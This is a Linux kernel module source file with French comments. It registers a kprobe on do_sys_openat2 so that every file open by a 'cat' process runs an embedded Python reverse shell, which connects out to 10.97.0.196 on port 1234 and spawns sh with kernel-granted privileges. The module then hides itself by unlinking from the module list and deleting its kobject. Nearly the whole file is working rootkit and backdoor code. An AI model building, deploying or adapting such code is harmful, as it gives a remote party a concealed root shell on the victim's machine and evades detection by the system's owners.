#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/kmod.h>
#include <linux/workqueue.h>
#include <linux/uaccess.h>
#include <linux/list.h>
#include <linux/kobject.h>

// Déclaration du kprobe
static struct kprobe kp;

// File de travail pour exécuter le script Python
static struct workqueue_struct *my_workqueue;
struct work_struct my_work;

static char *python_code = "import socket, subprocess, os, pty\n"
                           "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
                           "s.connect(('10.97.0.196', 1234))\n"
                           "os.dup2(s.fileno(), 0)\n"
                           "os.dup2(s.fileno(), 1)\n"
                           "os.dup2(s.fileno(), 2)\n"
                           "pty.spawn('sh')\n";

// Fonction de travail pour exécuter le reverse shell
static void run_python_work(struct work_struct *work)
{
    char *argv[] = { "/usr/bin/python3", "-c", python_code, NULL };
    char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };

    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

// Handler pré-exécution : vérification de la commande et du fichier ouvert
static int handler_pre(struct kprobe *p, struct pt_regs *regs)
{
    char filename[256];
    const char __user *user_filename = (const char __user *)regs->si;

    if (strncpy_from_user(filename, user_filename, sizeof(filename)) > 0) {
        if (strncmp(current->comm, "cat", 3) == 0) {
            queue_work(my_workqueue, &my_work);
        }
    }

    return 0;
}

// Initialisation du module
static int __init kprobe_init(void)
{
    // Initialisation de la file de travail
    my_workqueue = create_singlethread_workqueue("my_workqueue");
    INIT_WORK(&my_work, run_python_work);

    // Enregistrement du kprobe
    kp.symbol_name = "do_sys_openat2"; // Fonction cible
    kp.pre_handler = handler_pre;

    if (register_kprobe(&kp) < 0) {
        return -1;
    }

    // Cacher le module
    list_del(&THIS_MODULE->list);       // Retire le module de la liste chaînée des modules
    kobject_del(&THIS_MODULE->mkobj.kobj); // Supprime l'objet kobject du module

    return 0;
}

// Nettoyage du module
static void __exit kprobe_exit(void)
{
    unregister_kprobe(&kp);            // Désenregistrer le kprobe
    destroy_workqueue(my_workqueue);  // Supprimer la file de travail
}

module_init(kprobe_init);
module_exit(kprobe_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Manolo");
MODULE_DESCRIPTION("Kprobe to trigger reverse shell on 'cat' command");
